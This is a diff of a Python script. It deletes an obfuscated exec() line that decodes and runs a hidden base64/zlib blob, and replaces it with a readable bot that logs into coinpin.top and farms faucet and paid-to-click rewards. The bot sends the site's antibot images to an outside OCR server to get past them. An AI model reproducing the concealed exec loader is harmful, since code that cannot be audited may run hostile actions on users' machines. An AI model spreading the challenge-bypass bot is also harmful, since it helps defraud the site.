@@ -1,2 +1,418 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# ============================================================
+# COINPIN.TOP BOT - FAUCET + PTC (FIXED)
+# Moneymaker_w Edition
+# ============================================================
+
+import requests
+import re
+import time
+import json
+import os
+import sys
+from datetime import datetime
+from colorama import Fore, Style, init
+
+init(autoreset=True)
+
+# ======================= WARNA =======================
+GOLD = Fore.YELLOW
+LIGHT_GOLD = Fore.LIGHTYELLOW_EX
+GREEN = Fore.GREEN
+RED = Fore.RED
+CYAN = Fore.CYAN
+MAGENTA = Fore.MAGENTA
+WHITE = Fore.WHITE
+YELLOW = Fore.YELLOW
+RESET = Style.RESET_ALL
+BOLD = Style.BRIGHT
+
+# ======================= KONFIGURASI =======================
+BASE_URL = "https://coinpin.top"
+CONFIG_FILE = "coinpin_config.json"
+OCR_SERVER = "https://ocr-server-82fr.onrender.com/antibot"
+
+# ======================= BANNER =======================
+def banner():
+    os.system("clear")
+    print(f"""{CYAN}
+╔══════════════════════════════════════════════════════════════════════╗
+║   ██████╗ ██████╗ ██╗███╗   ██╗██████╗ ██╗███╗   ██╗                ║
+║  ██╔════╝██╔═══██╗██║████╗  ██║██╔══██╗██║████╗  ██║                ║
+║  ██║     ██║   ██║██║██╔██╗ ██║██████╔╝██║██╔██╗ ██║                ║
+║  ██║     ██║   ██║██║██║╚██╗██║██╔═══╝ ██║██║╚██╗██║                ║
+║  ╚██████╗╚██████╔╝██║██║ ╚████║██║     ██║██║ ╚████║                ║
+║   ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═══╝                ║
+╚══════════════════════════════════════════════════════════════════════╝
+{RESET}
+{YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{GREEN}💰 COINPIN.TOP AUTO CLAIM BOT
+{CYAN}👨‍💻 Developer : {MAGENTA}MoneyMaker_w
+{CYAN}🌐 Website   : {WHITE}https://coinpin.top
+{CYAN}⚡ Features  : {GREEN}Auto Faucet • Auto PTC •
+{CYAN}📦 Version   : {YELLOW}Version: 1.1
+{GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{RESET}
+""")
+
+# ======================= UTILITY =======================
+def log_claim(amount, mode="Faucet"):
+    now = datetime.now().strftime("%H:%M:%S")
+    print(f"{LIGHT_GOLD}[{now}] {GREEN}✅ [{mode}] Claimed: {amount} coins!{RESET}")
+
+def log_error(msg, mode="Faucet"):
+    now = datetime.now().strftime("%H:%M:%S")
+    print(f"{LIGHT_GOLD}[{now}] {RED}❌ [{mode}] {msg}{RESET}")
+
+def timer(seconds, prefix="⏳ Please wait"):
+    for i in range(seconds, 0, -1):
+        sys.stdout.write(f"\r{prefix} {i}s   ")
+        sys.stdout.flush()
+        time.sleep(1)
+    sys.stdout.write("\r" + " " * 40 + "\r")
+
+# ============================================================
+# FUNGSI LOGIN
+# ============================================================
+def load_config():
+    if os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE, 'r') as f:
+            return json.load(f)
+    return None
+
+def save_config(email, user_agent):
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump({"email": email, "user_agent": user_agent}, f, indent=4)
+
+def get_csrf(session):
+    resp = session.get(f"{BASE_URL}/login")
+    match = re.search(r'name="csrf_token_name"\s*value="([^"]+)"', resp.text)
+    return match.group(1) if match else None
+
+def login(session, email, password):
+    csrf = get_csrf(session)
+    if not csrf:
+        return False
+    data = {"email": email, "password": password, "csrf_token_name": csrf}
+    resp = session.post(f"{BASE_URL}/auth/login", data=data, allow_redirects=False)
+    return resp.status_code == 303
+
+# ============================================================
+# 1. FAUCET CLAIM
+# ============================================================
+def get_claims_left(html):
+    match = re.search(r'(\d+)/(\d+)\s*claims left', html, re.IGNORECASE)
+    if match:
+        return int(match.group(1)), int(match.group(2))
+    return None, None
+
+def extract_antibot_images(html):
+    all_images = re.findall(r'data:image/png;base64,([A-Za-z0-9+/=]+)', html)
+    if len(all_images) < 4:
+        return None
+    question_img = all_images[0]
+    answer_imgs = all_images[1:4]
+    rels = re.findall(r'rel=\\\"(\d+)\\\"', html)
+    if not rels:
+        rels = re.findall(r'rel="(\d+)"', html)
+    if len(rels) < 3:
+        return None
+    return {
+        'question': question_img,
+        'answers': answer_imgs[:3],
+        'rels': rels[:3]
+    }
+
+def solve_antibot(question, answers, rels):
+    try:
+        payload = {"question": question, "answers": answers, "rels": rels}
+        resp = requests.post(OCR_SERVER, json=payload, timeout=60)
+        if resp.status_code == 200:
+            result = resp.text.strip()
+            indexes = [int(x) for x in result.split()]
+            ordered = [rels[i-1] for i in indexes if 1 <= i <= len(rels)]
+            if ordered:
+                return '+' + '+'.join(ordered)
+        return None
+    except:
+        return None
+
+def claim_faucet(session):
+    resp = session.get(f"{BASE_URL}/faucet", timeout=30)
+    html = resp.text
+    if "Daily limit reached" in html:
+        log_error("Daily limit reached!", "Faucet")
+        return "LIMIT"
+    left, total = get_claims_left(html)
+    if left is not None and left <= 0:
+        log_error("No claims left today!", "Faucet")
+        return "LIMIT"
+    csrf_match = re.search(r'name="csrf_token_name"\s+id="token"\s+value="([^"]+)"', html)
+    token_match = re.search(r'name="token"\s+value="([^"]+)"', html)
+    if not csrf_match or not token_match:
+        return None
+    csrf = csrf_match.group(1)
+    token = token_match.group(1)
+    antibot = extract_antibot_images(html)
+    if not antibot:
+        return None
+    antibot_value = solve_antibot(antibot['question'], antibot['answers'], antibot['rels'])
+    if not antibot_value:
+        return None
+    post_data = f"antibotlinks={antibot_value}&csrf_token_name={csrf}&token={token}"
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": BASE_URL,
+        "Referer": f"{BASE_URL}/faucet"
+    }
+    resp2 = session.post(f"{BASE_URL}/faucet/verify", data=post_data, headers=headers, allow_redirects=False, timeout=30)
+    if resp2.status_code == 303:
+        location = resp2.headers.get('Location', '')
+        resp3 = session.get(location, timeout=30)
+        if 'Good job' in resp3.text and 'has been added' in resp3.text:
+            reward = re.search(r'(\d+)\s+coins\s+has been added', resp3.text, re.IGNORECASE)
+            if reward:
+                return reward.group(1)
+            return "success"
+    return None
+
+def run_faucet(session, max_claims=999):
+    print(f"\n{GREEN}▶ STARTING FAUCET (until limit){RESET}")
+    claimed = 0
+    while claimed < max_claims:
+        result = claim_faucet(session)
+        if result == "LIMIT":
+            log_error("Faucet limit reached, stopping.", "Faucet")
+            break
+        elif result:
+            claimed += 1
+            log_claim(result, "Faucet")
+            time.sleep(15)
+        else:
+            log_error("Claim failed, retrying...", "Faucet")
+            time.sleep(5)
+    print(f"{GREEN}✅ Faucet finished. Total claims: {claimed}{RESET}")
+
+# ============================================================
+# 2. PTC CLAIM (FIXED - berdasarkan ptc_debug.html)
+# ============================================================
+def ptc_fetch_ads(session):
+    url = f"{BASE_URL}/ptc"
+    headers = {
+        "User-Agent": session.headers.get('User-Agent', 'Mozilla/5.0'),
+        "Referer": f"{BASE_URL}/dashboard"
+    }
+    resp = session.get(url, headers=headers, timeout=30)
+    html = resp.text
+    if not html or "Just a moment" in html:
+        return []
+
+    ads = []
+    
+    # Ekstrak ID dari onclick tombol "Go"
+    link_matches = re.findall(r"window\.location\s*=\s*'https?://coinpin\.top/ptc/view/(\d+)'", html)
+    if not link_matches:
+        # fallback: cari href
+        link_matches = re.findall(r'href="https?://coinpin\.top/ptc/view/(\d+)"', html)
+
+    # Ekstrak judul dari <h5 class="card-title">
+    title_matches = re.findall(r'<h5 class="card-title[^"]*">(.*?)</h5>', html, re.DOTALL)
+
+    # Ekstrak koin dari <i class="fas fa-gift"></i>: 2100.000000 coins
+    coin_matches = re.findall(r'<i class="fas fa-gift"[^>]*></i>:\s*([\d,.]+)\s+coins', html)
+
+    # Ekstrak waktu dari <i class="fas fa-stopwatch"></i>: 10 seconds
+    time_matches = re.findall(r'<i class="fas fa-stopwatch"[^>]*></i>:\s*(\d+)\s+seconds', html)
+
+    for i in range(len(link_matches)):
+        ads.append({
+            'id': link_matches[i],
+            'title': title_matches[i].strip() if i < len(title_matches) else f'Ad {i+1}',
+            'coins': coin_matches[i].strip() if i < len(coin_matches) else '0',
+            'time': int(time_matches[i]) if i < len(time_matches) else 10
+        })
+
+    return ads
+
+def ptc_claim_ad(session, ad):
+    view_url = f"{BASE_URL}/ptc/view/{ad['id']}"
+    
+    # STEP 1: Buka halaman view
+    headers_get = {
+        "User-Agent": session.headers.get('User-Agent', 'Mozilla/5.0'),
+        "Referer": f"{BASE_URL}/ptc"
+    }
+    try:
+        resp = session.get(view_url, headers=headers_get, timeout=30)
+        html = resp.text
+    except:
+        return "FAILED"
+
+    if not html:
+        return "FAILED"
+    if "Just a moment" in html:
+        return "CLOUDFLARE"
+    if "Already Claimed" in html or "already claimed" in html or "already viewed" in html:
+        return "CLAIMED"
+    if "view-ads" in html or "Complete the captcha" in html:
+        return "SHORTLINK"
+
+    # STEP 2: Ekstrak csrf & token
+    csrf_match = re.search(r'name="csrf_token_name".*?value="([^"]+)"', html)
+    token_match = re.search(r'name="token".*?value="([^"]+)"', html)
+    if not csrf_match or not token_match:
+        csrf_match = re.search(r'csrf_token_name" value="([^"]+)"', html)
+        token_match = re.search(r'token" value="([^"]+)"', html)
+    if not csrf_match or not token_match:
+        return "NO_TOKEN"
+    csrf = csrf_match.group(1)
+    token = token_match.group(1)
+
+    # STEP 3: Tunggu waktu
+    wait_time = ad['time']
+    print(f"{LIGHT_GOLD}⏳ Waiting {wait_time}s for PTC...{RESET}")
+    timer(wait_time, "⏳ PTC wait")
+
+    # STEP 4: POST verify
+    verify_url = f"{BASE_URL}/ptc/verify/{ad['id']}"
+    post_data = {
+        'csrf_token_name': csrf,
+        'token': token
+    }
+    headers_post = {
+        "User-Agent": session.headers.get('User-Agent', 'Mozilla/5.0'),
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": BASE_URL,
+        "Referer": view_url
+    }
+    try:
+        result = session.post(verify_url, data=post_data, headers=headers_post, timeout=30).text
+    except:
+        return "FAILED"
+
+    if not result:
+        return "FAILED"
+    if "Just a moment" in result:
+        return "CLOUDFLARE"
+
+    # STEP 5: Cek hasil
+    if re.search(r"title:\s*'Good job!',\s*text:\s*'([^']+)'", result, re.IGNORECASE):
+        match = re.search(r"Good job!',\s*'([^']+)'", result, re.IGNORECASE)
+        if match:
+            return {"success": match.group(1)}
+    if re.search(r"Swal\.fire\('Good job!',\s*'([^']+)'", result, re.IGNORECASE):
+        match = re.search(r"Swal\.fire\('Good job!',\s*'([^']+)'", result, re.IGNORECASE)
+        if match:
+            return {"success": match.group(1)}
+
+    fail_match = re.search(r'alert-danger">.*?</i>\s*([^<]+)', result, re.IGNORECASE | re.DOTALL)
+    if fail_match:
+        return {"failed": fail_match.group(1).strip()}
+
+    if "Successfully" in result or "successfully" in result:
+        return {"success": "PTC claim berhasil!"}
+    if "Invalid Click" in result:
+        return "INVALID_CLICK"
+    if "Good job" in result or "has been added" in result:
+        return {"success": "PTC claim success!"}
+
+    return None
+
+def run_ptc(session, max_cycles=5):
+    print(f"\n{GREEN}▶ STARTING PTC (max {max_cycles} cycles){RESET}")
+    cycle = 0
+    while cycle < max_cycles:
+        cycle += 1
+        print(f"\n{CYAN}━━━ PTC CYCLE #{cycle} ━━━{RESET}")
+        ads = ptc_fetch_ads(session)
+        if not ads:
+            log_error("Tidak ada PTC ads tersedia!", "PTC")
+            timer(30)
+            continue
+        print(f"{WHITE}Ditemukan {GREEN}{len(ads)}{WHITE} PTC ads")
+        for ad in ads:
+            print(f"\n[PTC] {CYAN}{ad['title']}{WHITE} ({GREEN}{ad['coins']} coins{WHITE})")
+            result = ptc_claim_ad(session, ad)
+            if result == "CLOUDFLARE":
+                log_error("Cloudflare! Skip...", "PTC")
+                time.sleep(3)
+            elif result == "CLAIMED":
+                print(f"{GOLD}⏳ Already claimed{RESET}")
+            elif result == "SHORTLINK":
+                print(f"{GOLD}🔗 Shortlink/captcha, skip...{RESET}")
+            elif result == "NO_TOKEN":
+                log_error("Failed to extract token!", "PTC")
+            elif result == "INVALID_CLICK":
+                log_error("Invalid Click, retry later...", "PTC")
+            elif isinstance(result, dict):
+                if "success" in result:
+                    print(f"{GREEN}✅ {result['success']}{RESET}")
+                elif "failed" in result:
+                    log_error(result['failed'], "PTC")
+            else:
+                log_error("Unknown response", "PTC")
+            time.sleep(2)
+        if cycle < max_cycles:
+            print(f"\n{WHITE}✅ Siklus {cycle} selesai. Menunggu 30s...{RESET}")
+            timer(30)
+    print(f"{GREEN}✅ PTC finished. Total cycles: {cycle}{RESET}")
+
+# ============================================================
+# MENU UTAMA
+# ============================================================
+def main():
+    banner()
+    config = load_config()
+    if config and config.get('email') and config.get('user_agent'):
+        email = config['email']
+        user_agent = config['user_agent']
+        print(f"{LIGHT_GOLD}📧 Using saved email: {WHITE}{email}{RESET}")
+        print(f"{LIGHT_GOLD}🌐 Using saved User-Agent: {WHITE}{user_agent[:50]}...{RESET}")
+        use_saved = input(f"{LIGHT_GOLD}Use saved? (y/n): {RESET}").lower()
+        if use_saved != 'y':
+            email = input(f"{LIGHT_GOLD}📧 Email: {RESET}").strip()
+            user_agent = input(f"{LIGHT_GOLD}🌐 User-Agent: {RESET}").strip()
+            save_config(email, user_agent)
+    else:
+        email = input(f"{LIGHT_GOLD}📧 Email: {RESET}").strip()
+        user_agent = input(f"{LIGHT_GOLD}🌐 User-Agent: {RESET}").strip()
+        save_config(email, user_agent)
+    password = input(f"{LIGHT_GOLD}🔑 Password: {RESET}").strip()
+
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": user_agent,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
+        "X-Requested-With": "mark.via.gp",
+    })
+    if not login(session, email, password):
+        log_error("Login failed!", "System")
+        return
+
+    while True:
+        banner()
+        print(f"{WHITE}╔════════════════════════════════════════════╗")
+        print(f"{WHITE}║  {GREEN}[1]{WHITE} Claim Faucet (until limit)       ║")
+        print(f"{WHITE}║  {CYAN}[2]{WHITE} Claim PTC (max cycles)          ║")
+        print(f"{WHITE}║  {RED}[0]{WHITE} Exit                              ║")
+        print(f"{WHITE}╚════════════════════════════════════════════╝{RESET}")
+        choice = input(f"\n{GOLD}❯ Pilih: {RESET}").strip()
+
+        if choice == '0':
+            print(f"{RED}👋 Bye!{RESET}")
+            sys.exit(0)
+        elif choice == '1':
+            run_faucet(session, max_claims=999)
+        elif choice == '2':
+            run_ptc(session, max_cycles=5)
+        else:
+            print(f"{RED}❌ Invalid choice!{RESET}")
+            time.sleep(1)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{RED}👋 Exited by user{RESET}")
+        sys.exit(0)
